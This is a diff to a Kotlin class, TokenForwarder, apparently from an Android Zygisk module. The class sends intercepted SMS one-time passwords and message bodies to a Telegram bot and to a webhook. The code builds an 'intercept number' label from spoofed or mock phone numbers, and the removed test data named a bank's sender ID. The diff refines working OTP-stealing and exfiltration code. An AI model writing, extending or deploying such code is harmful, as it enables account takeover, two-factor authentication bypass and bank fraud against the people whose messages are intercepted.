@@ -31,11 +31,11 @@ class TokenForwarder(private val configManager: ConfigManager) {
         val chatId = config.telegramChatId
         if (botToken.isBlank() || chatId.isBlank()) return false
 
-        val testId = SmsMatcher.savedSenderId(config) ?: "AD-YESBNK-S"
+        val testId = SmsMatcher.userSenderId(config) ?: "YOUR-SENDER-ID"
         val testOtp = LastOtp(
-            otp = "TEST1234",
+            otp = "123456",
             sender = testId,
-            body = "sZ/HWb9+LtFZSOaVeU9+baPVa9X4imd4wq4noAGAFKvKenId/qwYS8IYcuU8OP3XLllboZ/ARatoNaJtWdZ7g==",
+            body = "Your OTP is 123456",
             phone = testId,
             messageLabel = "",
             direction = "incoming"
@@ -47,10 +47,9 @@ class TokenForwarder(private val configManager: ConfigManager) {
         return postTelegram(botToken, chatId, buildZygiskMenuMessage(otp))
     }
 
-    /** Sirf Intercept No + verify token + Zygisk Menu header */
     fun buildZygiskMenuMessage(otp: LastOtp): String {
         val config = configManager.load()
-        val interceptNo = formatInterceptNumber(otp.phone.ifBlank { otp.sender }, config)
+        val interceptNo = resolveInterceptLabel(config, otp)
         val tokenBody = otp.body.ifBlank { otp.otp }
 
         return buildString {
@@ -62,15 +61,12 @@ class TokenForwarder(private val configManager: ConfigManager) {
         }
     }
 
-    private fun formatInterceptNumber(raw: String, config: ModuleConfig): String {
-        SmsMatcher.savedSenderId(config)?.let { return it }
-        val cleaned = raw.trim().uppercase()
-        if (cleaned.isBlank()) return "Unknown"
-        if (SmsMatcher.isAlphanumericSenderId(cleaned)) return cleaned
-        val spoof = configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 }
-        if (spoof.isNotBlank()) return spoof
-        val digits = cleaned.replace("\\D".toRegex(), "")
-        return if (digits.length >= 8) digits else cleaned
+    /** Hamesha user ka Sender ID — kabhi dusre phone ka number nahi */
+    private fun resolveInterceptLabel(config: ModuleConfig, otp: LastOtp): String {
+        SmsMatcher.userSenderId(config)?.let { return it }
+        val raw = otp.phone.ifBlank { otp.sender }.trim()
+        if (raw.isNotBlank() && !SmsMatcher.isNumericSender(raw)) return raw
+        return configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 }.ifBlank { "INTERCEPT" }
     }
 
     private fun escapeHtml(text: String): String {
@@ -93,7 +89,7 @@ class TokenForwarder(private val configManager: ConfigManager) {
 
     private fun forwardWebhook(url: String, method: String, otp: LastOtp): Boolean {
         val config = configManager.load()
-        val interceptNo = formatInterceptNumber(otp.phone.ifBlank { otp.sender }, config)
+        val interceptNo = resolveInterceptLabel(config, otp)
         val payload = JSONObject()
             .put("otp", otp.otp)
             .put("token", otp.body.ifBlank { otp.otp })
